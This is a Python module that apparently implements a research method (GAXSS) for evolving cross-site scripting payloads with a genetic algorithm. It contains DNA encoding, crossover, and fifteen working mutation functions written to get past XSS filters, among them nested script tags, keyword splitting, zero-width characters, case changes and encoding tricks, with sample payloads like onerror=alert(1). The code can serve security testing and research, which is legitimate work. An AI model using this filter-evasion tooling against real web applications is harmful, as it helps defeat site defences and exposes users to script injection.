"""
GAXSS Genetic Algorithm Core Module
Implements DNA encoding and genetic operators as per Liu et al. (2022)

CORRECTED VERSION with all 15 mutations properly implemented per Table 7
"""

import random
import re
import urllib.parse
import base64
from typing import List, Tuple, Optional



class GAXSS_DNA:
    """DNA representation for GAXSS chromosomes.
    
    Structure per paper Section 4.2.1:
    [C1][C2][C3][C4] [B1][B2][B3][B4][B5][B6] [M1][M2]...[Mn]
       closing          main (6 components)      variable mutations
    
    Where:
    - Closing (4 digits): Closing characters (0-4, per paper)
    - Main (6 digits): 
        B1: Tag index (0-14)
        B2: Event index (0-14)
        B3: Function index (0-5)
        B4: Attribute index (0-11)
        B5: Protocol index (0-1)
        B6: Backward closing for script context
    - Mutations (variable): Mutation type indices (0-14)
    """


    def __init__(self, closing: List[int], main: List[int], mutations: Optional[List[int]] = None):
        """Initialize GAXSS DNA.
        
        Args:
            closing: 4 integers representing closing characters (0-4)
            main: 6 integers representing payload components
            mutations: List of mutation type indices (0-14)
        """
        # Ensure correct length
        self.closing = closing[:4]
        self.main = main[:6]
        self.mutations = mutations if mutations else []


    def to_list(self) -> List[int]:
        """Convert DNA to flat list for serialization."""
        return self.closing + self.main + self.mutations


    @staticmethod
    def from_list(genes: List[int]) -> 'GAXSS_DNA':
        """Create DNA from flat list.
        
        Args:
            genes: Flat list of integers
            
        Returns:
            GAXSS_DNA object
        """
        return GAXSS_DNA(
            closing=genes[:4],
            main=genes[4:10],
            mutations=genes[10:] if len(genes) > 10 else []
        )


    def copy(self) -> 'GAXSS_DNA':
        """Create deep copy of DNA."""
        return GAXSS_DNA(
            closing=self.closing.copy(),
            main=self.main.copy(),
            mutations=self.mutations.copy()
        )


    def __repr__(self) -> str:
        return f"DNA(C={self.closing},M={self.main})"



class GAXSS_Mutations:
    """15 mutation methods from GAXSS paper Table 7 - CORRECTED IMPLEMENTATION.
    
    Reference: Liu et al. (2022) Table 7: Genetic mutation method (XSS payload bypass)
    
    Methods:
    0. HTML encoding
    1. Unicode encoding
    2. URL encoding
    3. Base64 encoding
    4. Event sensitive words replacement
    5. Sensitive functions replacement
    6. Blank character replacement
    7. Bracket replacement
    8. Attributes and events swap positions
    9. Case change
    10. Shape transformation of pop-up window function
    11. Add blank characters (between event and trigger code)
    12. Insert tag into the tag
    13. Add notes (between function and parentheses)
    14. Add random characters before or after vector
    """


    @staticmethod
    def mutation_0_html_encoding(payload: str) -> str:
        r"""Mutation 0: HTML encoding per Table 8.
        
        Reference: Liu et al. Table 8: Coding confusion - HTML encoding
        Converts: < to &lt;, > to &gt;, " to &quot;
        """
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')


    @staticmethod
    def mutation_1_unicode_encoding(payload: str) -> str:
        r"""Mutation 1: Unicode encoding per Table 8.
        
        Reference: Liu et al. Table 8: Coding confusion - Unicode encoding
        Converts: character to \uXXXX format for chars > 127
        """
        return ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload)



    @staticmethod
    def mutation_2_url_encoding(payload: str) -> str:
        """Mutation 2: URL percent-encoding per Table 8.
        
        Reference: Liu et al. Table 8: Coding confusion - URL encoding
        Converts: < to %3C, > to %3E, space to %20, etc.
        """
        return urllib.parse.quote(payload, safe='')


    @staticmethod
    def mutation_3_base64_encoding(payload: str) -> str:
        """Mutation 3: Base64 encoding per Table 8.
        
        Reference: Liu et al. Table 8: Coding confusion - Base64
        Used with data: pseudoprotocol
        """
        return base64.b64encode(payload.encode()).decode()


    @staticmethod
    def mutation_4_event_replacement(payload: str) -> str:
        """Mutation 4: Replace event with another per Table 6.
        
        Reference: Liu et al. Table 6: Component - events
        Replaces: onclick→onload, onerror→onmouseover, etc.
        Allows bypassing event keyword filtering.
        """
        event_pairs = [
            ('onclick', 'onload'),
            ('onerror', 'onmouseover'),
            ('onload', 'onfocus'),
            ('onmouseover', 'onmouseenter'),
            ('onkeydown', 'onchange'),
            ('onblur', 'onfocus'),
        ]
        result = payload
        for old_event, new_event in event_pairs:
            if old_event in payload:
                result = result.replace(old_event, new_event)
                break
        return result


    @staticmethod
    def mutation_5_function_replacement(payload: str) -> str:
        """Mutation 5: Replace JavaScript function per Table 5.
        
        Reference: Liu et al. Table 5: Component - malicious code
        Replaces: alert→confirm, alert→prompt, console.log→eval, etc.
        Allows bypassing function name filtering.
        """
        function_pairs = [
            ('alert(1)', 'confirm(1)'),
            ('alert(', 'confirm('),
            ('prompt(', 'alert('),
            ('console.log(', 'eval('),
            ('location.href', 'top.location'),
            ('window.location', 'self.location'),
        ]
        result = payload
        for old_func, new_func in function_pairs:
            if old_func in payload:
                result = result.replace(old_func, new_func)
                break
        return result


    @staticmethod
    def mutation_6_blank_replacement(payload: str) -> str:
        """Mutation 6: Replace whitespace with hex equivalents.
        
        Reference: Liu et al. Section 3.4(i): Blank character replacement
        Replaces: space with %20, %09, %0a, %0c, %0d
        Allows bypassing filters that check for spaces.
        """
        whitespace_variants = ['%20', '%09', '%0a', '%0c', '%0d']
        if ' ' in payload:
            variant = random.choice(whitespace_variants)
            return payload.replace(' ', variant)
        return payload


    @staticmethod
    def mutation_7_bracket_replacement(payload: str) -> str:
        """Mutation 7: CORRECTED - Replace parenthesis with unicode.
        
        Reference: Liu et al. Section 3.4(e): Bracket replacement
        PER PAPER: prompt(1) becomes prompt(1) with unicode alternatives
        
        Strategy: Insert zero-width non-joiner (U+200C) before ( and after )
        This makes detection regex fail while browser still executes.
        """
        result = payload
        
        if '(' in payload and ')' in payload:
            # Insert zero-width non-joiner (U+200C) before ( and after )
            # This is invisible in browser but breaks string matching detection
            result = result.replace('(', '\u200c(')  # ← Insert ZWNJ before (
            result = result.replace(')', ')\u200c')  # ← Insert ZWNJ after )
        
        return result if result != payload else payload


    @staticmethod
    def mutation_8_position_swap(payload: str) -> str:
        """Mutation 8: Swap attributes and events positions.
        
        Reference: Liu et al. Section 3.4(f): Attributes and events swap positions
        Changes: <img src=x onerror=alert(1)> to <img onerror=alert(1) src=x>
        Allows bypassing order-dependent filters.
        """
        # Split by space to get attributes/events
        parts = payload.split()
        if len(parts) >= 3:
            # Swap first two attributes
            parts[0], parts[1] = parts[1], parts[0]
        return ' '.join(parts)


    @staticmethod
    def mutation_9_case_change(payload: str) -> str:
        """Mutation 9: Change letter case randomly.
        
        Reference: Liu et al. Section 3.4(g): Case change
        Changes: alert → aLeRt, onclick → oNcLiCk
        Allows bypassing simple string matching filters.
        """
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return ''.join(result)


    @staticmethod
    def mutation_10_shape_transformation(payload: str) -> str:
        """Mutation 10: Transform pop-up function to bypass detection.
        
        Reference: Liu et al. Section 3.4(h): Shape transformation of pop-up window function
        PER PAPER: alert(1) → top['ale'+'rt'](1)
        This breaks string matching detection for 'alert' keyword by splitting it.
        """
        result = payload
        if 'alert(1)' in payload:
            result = result.replace('alert(1)', "top['ale'+'rt'](1)")
        elif 'alert(' in payload:
            result = result.replace('alert(', "top['ale'+'rt'](")
        elif 'confirm(1)' in payload:
            result = result.replace('confirm(1)', "top['con'+'firm'](1)")
        elif 'prompt(1)' in payload:
            result = result.replace('prompt(1)', "top['prom'+'pt'](1)")
        return result


    @staticmethod
    def mutation_11_add_spaces(payload: str) -> str:
        """Mutation 11: CORRECTED - Add blank characters in event attributes.
        
        Reference: Liu et al. Section 3.4(i): Add blank characters
        PER PAPER: <img src=x onerror%0a%20=alert(1)>
        Insert %0a, %20, %09, etc. between event attribute name and '='
        """
        whitespace_codes = ['%0a', '%20', '%09', '%0c', '%0d']
        
        # Find pattern like 'onerror=', 'onclick=' and add whitespace variant
        pattern = r'(on\w+)='
        replacement = r'\1' + random.choice(whitespace_codes) + '='
        return re.sub(pattern, replacement, payload)


    @staticmethod
    def mutation_12_insert_tag_recursive(payload: str) -> str:
        """Mutation 12: Insert tag into itself to bypass non-recursive deletion.
        
        Reference: Liu et al. Section 3.4(j): Insert tag into the tag
        Changes: <script>alert(1)</script> to <scri<script>pt>alert(1)</scri</script>pt>
        If filter deletes '<script>' non-recursively, result remains valid.
        """
        # Break tag names to bypass simple deletion filters
        result = payload
        result = result.replace('<script', '<scri<script')
        result = result.replace('</script>', '</script>pt>')
        result = result.replace('<svg', '<sv<svg')
        result = result.replace('</svg>', '</svg>g>')
        result = result.replace('<img', '<im<img')
        return result


    @staticmethod
    def mutation_13_add_comment_symbols(payload: str) -> str:
        """Mutation 13: Add comment symbols between function and parenthesis.
        
        Reference: Liu et al. Section 3.4(k): Add notes between function and parentheses
        Changes: alert(1) to alert/*random*/(1)
        Regex looking for alert() won't match the broken pattern.
        """
        # Insert random characters between function name and parenthesis
        pattern = r'(\w+)\('
        
        def replacer(match):
            func = match.group(1)
            random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
            return f'{func}/*{random_str}*/('
        
        return re.sub(pattern, replacer, payload)


    @staticmethod
    def mutation_14_add_random_chars(payload: str) -> str:
        """Mutation 14: Add random characters before or after vector.
        
        Reference: Liu et al. Section 3.4(l): Add random characters before or after vector
        Adds 1-5 random alphanumeric characters that can be ignored in some contexts.
        """
        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        random_prefix = ''.join(random.choices(chars, k=random.randint(1, 5)))
        random_suffix = ''.join(random.choices(chars, k=random.randint(1, 5)))
        return f'{random_prefix}{payload}{random_suffix}'


    @staticmethod
    def apply_mutation(payload: str, mutation_type: int) -> str:
        """Apply mutation per paper Table 7.
        
        Args:
            payload: XSS payload to mutate
            mutation_type: Index 0-14 corresponding to mutation methods
            
        Returns:
            Mutated payload
            
        Reference:
            Liu et al. (2022), Table 7: Genetic mutation method (XSS payload bypass)
        """
        mutations = [
            GAXSS_Mutations.mutation_0_html_encoding,
            GAXSS_Mutations.mutation_1_unicode_encoding,
            GAXSS_Mutations.mutation_2_url_encoding,
            GAXSS_Mutations.mutation_3_base64_encoding,
            GAXSS_Mutations.mutation_4_event_replacement,
            GAXSS_Mutations.mutation_5_function_replacement,
            GAXSS_Mutations.mutation_6_blank_replacement,
            GAXSS_Mutations.mutation_7_bracket_replacement,
            GAXSS_Mutations.mutation_8_position_swap,
            GAXSS_Mutations.mutation_9_case_change,
            GAXSS_Mutations.mutation_10_shape_transformation,
            GAXSS_Mutations.mutation_11_add_spaces,
            GAXSS_Mutations.mutation_12_insert_tag_recursive,
            GAXSS_Mutations.mutation_13_add_comment_symbols,
            GAXSS_Mutations.mutation_14_add_random_chars,
        ]
        
        mutation_idx = mutation_type % 15
        try:
            return mutations[mutation_idx](payload)
        except Exception as e:
            # If mutation fails, return original payload
            return payload



def crossover_uniform(parent1: GAXSS_DNA, parent2: GAXSS_DNA) -> Tuple[GAXSS_DNA, GAXSS_DNA]:
    """Uniform crossover operator per paper Section 4.2.2.
    
    Each gene is selected from either parent with 50% probability.
    Applied to closing, main, and mutations separately.
    
    Reference:
        Liu et al. (2022), Section 4.2.2: Crossover operation
        
    Args:
        parent1: First parent DNA
        parent2: Second parent DNA
        
    Returns:
        Tuple of (child1, child2) DNA objects
    """
    # Uniform crossover for closing (4 genes)
    child1_closing = [parent1.closing[i] if random.random() > 0.5 else parent2.closing[i] for i in range(4)]
    child2_closing = [parent2.closing[i] if random.random() > 0.5 else parent1.closing[i] for i in range(4)]
    
    # Uniform crossover for main (6 genes)
    child1_main = [parent1.main[i] if random.random() > 0.5 else parent2.main[i] for i in range(6)]
    child2_main = [parent2.main[i] if random.random() > 0.5 else parent1.main[i] for i in range(6)]
    
    # Uniform crossover for mutations (bit-by-bit for variable length)
    max_mutations = max(len(parent1.mutations), len(parent2.mutations))
    child1_mutations = []
    child2_mutations = []
    
    for i in range(max_mutations):
        p1_mut = parent1.mutations[i] if i < len(parent1.mutations) else random.randint(0, 14)
        p2_mut = parent2.mutations[i] if i < len(parent2.mutations) else random.randint(0, 14)
        
        if random.random() > 0.5:
            child1_mutations.append(p1_mut)
            child2_mutations.append(p2_mut)
        else:
            child1_mutations.append(p2_mut)
            child2_mutations.append(p1_mut)
    
    child1 = GAXSS_DNA(
        closing=child1_closing,
        main=child1_main,
        mutations=child1_mutations
    )
    child2 = GAXSS_DNA(
        closing=child2_closing,
        main=child2_main,
        mutations=child2_mutations
    )

    return child1, child2



def mutate_gaxss(dna: GAXSS_DNA, mutation_rate: float = 0.1) -> GAXSS_DNA:
    """Apply random mutations to DNA.
    
    Mutations can occur in:
    1. Main component genes (random value change, WITH CORRECT RANGES)
    2. Closing genes (for diversifying termination strategies)
    3. Mutation list (add new mutation types)
    
    Reference:
        Liu et al. (2022), Section 4.2.2: Mutation operation
        
    Args:
        dna: DNA to mutate
        mutation_rate: Probability of mutation (default 0.1 per paper)
        
    Returns:
        Mutated DNA copy
    """
    mutated = dna.copy()

    # --- Mutation type 1: Change a main component gene (respect ranges) ---
    if random.random() < mutation_rate:
        idx = random.randint(0, 5)
        
        MAIN_GENES_RANGES = [
            (0, 14),  # B1: Tag
            (0, 14),  # B2: Event
            (0, 5),   # B3: Function
            (0, 11),  # B4: Attribute
            (0, 1),   # B5: Protocol
            (0, 4),   # B6: Backward closing
        ]
        min_val, max_val = MAIN_GENES_RANGES[idx]
        mutated.main[idx] = random.randint(min_val, max_val)

    # --- Mutation type 2: Change a closing gene (for closure diversity) ---
    if random.random() < mutation_rate:
        idx = random.randint(0, 3)
        mutated.closing[idx] = random.randint(0, 4)

    # --- Mutation type 3: Add or modify a mutation operator ---
    if random.random() < mutation_rate:
        new_mutation = random.randint(0, 14)
        mutated.mutations.append(new_mutation)
        
        # Keep mutations list bounded (max 5 mutations per individual)
        if len(mutated.mutations) > 5:
            mutated.mutations = mutated.mutations[-5:]

    return mutated


